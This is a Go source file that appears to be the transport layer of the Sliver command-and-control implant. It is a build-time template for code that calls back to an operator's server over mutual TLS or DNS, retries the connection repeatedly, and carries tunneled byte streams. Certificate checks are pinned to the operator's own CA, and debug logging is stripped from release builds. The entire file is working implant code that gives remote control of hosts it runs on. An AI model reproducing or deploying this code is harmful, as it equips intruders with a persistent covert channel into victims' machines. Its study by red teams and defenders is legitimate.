package transports

import (
	"crypto/x509"
	"io"

	// {{if .Debug}}
	"log"
	// {{end}}

	"os"
	pb "sliver/protobuf/sliver"
	"strconv"
	"sync"
	"time"
)

var (
	keyPEM    = `{{.Key}}`
	certPEM   = `{{.Cert}}`
	caCertPEM = `{{.CACert}}`

	// {{if .MTLSServer}}
	mtlsServer = `{{.MTLSServer}}`
	// {{end}}

	// {{if .DNSParent}}
	dnsParent = `{{.DNSParent}}`
	// {{end}}

	readBufSize = 16 * 1024 // 16kb

	maxErrors = 100 // TODO: Make configurable

	mtlsLPort         = getDefaultMTLSLPort()
	reconnectInterval = getReconnectInterval()
)

// Connection - Abstract connection to the server
type Connection struct {
	Send    chan *pb.Envelope
	Recv    chan *pb.Envelope
	Ctrl    chan bool
	Cleanup func()
	tunnels *map[uint64]*Tunnel
	mutex   *sync.RWMutex
}

// Tunnel - Duplex byte read/write
type Tunnel struct {
	ID     uint64
	Reader io.ReadCloser
	Writer io.WriteCloser
}

// Tunnel - Add tunnel to mapping
func (c *Connection) Tunnel(ID uint64) *Tunnel {
	c.mutex.RLock()
	defer c.mutex.RUnlock()
	return (*c.tunnels)[ID]
}

// AddTunnel - Add tunnel to mapping
func (c *Connection) AddTunnel(tun *Tunnel) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	(*c.tunnels)[tun.ID] = tun
}

// RemoveTunnel - Add tunnel to mapping
func (c *Connection) RemoveTunnel(ID uint64) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	delete(*c.tunnels, ID)
}

// StartConnectionLoop - Starts the main connection loop
func StartConnectionLoop() *Connection {

	// {{if .Debug}}
	log.Printf("Starting connection loop ...")
	// {{end}}

	connectionAttempts := 0
	for connectionAttempts < maxErrors {

		var connection *Connection
		var err error

		// *** MTLS ***
		// {{if .MTLSServer}}
		connection, err = mtlsConnect()
		if err == nil {
			return connection
		}
		// {{if .Debug}}
		log.Printf("[mtls] Connection failed %s", err)
		// {{end}}
		connectionAttempts++
		// {{end}}  - MTLSServer

		// *** DNS ***
		// {{if .DNSParent}}
		connection, err = dnsConnect()
		if err == nil {
			return connection
		}
		// {{if .Debug}}
		log.Printf("[dns] Connection failed %s", err)
		// {{end}}
		connectionAttempts++
		// {{end}} - DNSParent

		time.Sleep(reconnectInterval)
	}
	// {{if .Debug}}
	log.Printf("[!] Max connection errors reached\n")
	// {{end}}

	return nil
}

func getReconnectInterval() time.Duration {
	reconnect, err := strconv.Atoi(`{{.ReconnectInterval}}`)
	if err != nil {
		return 30 * time.Second
	}
	return time.Duration(reconnect) * time.Second
}

// {{if .MTLSServer}}
func mtlsConnect() (*Connection, error) {
	// {{if .Debug}}
	log.Printf("Connecting -> %s:%d", mtlsServer, uint16(mtlsLPort))
	// {{end}}
	conn, err := tlsConnect(mtlsServer, uint16(mtlsLPort))
	if err != nil {
		return nil, err
	}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		Ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		Cleanup: func() {
			conn.Close()
		},
	}

	go func() {
		for envelope := range send {
			socketWriteEnvelope(conn, envelope)
		}
	}()

	go func() {
		defer func() { ctrl <- true }()
		for {
			envelope, err := socketReadEnvelope(conn)
			if err == io.EOF {
				break
			}
			if err == nil {
				recv <- envelope
			}
		}
	}()

	return connection, nil
}

// {{end}} -MTLSServer

func getDefaultMTLSLPort() int {
	lport, err := strconv.Atoi(`{{.MTLSLPort}}`)
	if err != nil {
		return 8888
	}
	return lport
}

// {{if .DNSParent}}
func dnsConnect() (*Connection, error) {
	// {{if .Debug}}
	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
	// {{end}}
	sessionID, sessionKey, err := dnsStartSession(dnsParent)
	if err != nil {
		return nil, err
	}
	// {{if .Debug}}
	log.Printf("Starting new session with id = %s\n", sessionID)
	// {{end}}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	pollCtrl := make(chan bool)
	ctrl := make(chan bool)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		Ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		Cleanup: func() {
			pollCtrl <- true // Stop polling
			close(pollCtrl)
		},
	}

	go func() {
		for envelope := range send {
			go dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
		}
	}()

	go dnsSessionPoll(dnsParent, sessionID, sessionKey, pollCtrl, recv)

	return connection, nil
}

// {{end}} - DNSParent

// rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
// we have to disable all of the fucking certificate validation and re-implement everything.
// https://github.com/golang/go/issues/21971
func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {

	roots := x509.NewCertPool()
	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
	if !ok {
		// {{if .Debug}}
		log.Printf("Failed to parse root certificate")
		// {{end}}
		os.Exit(3)
	}

	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to parse certificate: " + err.Error())
		// {{end}}
		return err
	}

	// Basically we only care if the certificate was signed by our authority
	// Go selects sensible defaults for time and EKU, basically we're only
	// skipping the hostname check, I think?
	options := x509.VerifyOptions{
		Roots: roots,
	}
	if _, err := cert.Verify(options); err != nil {
		// {{if .Debug}}
		log.Printf("Failed to verify certificate: " + err.Error())
		// {{end}}
		return err
	}

	return nil
}
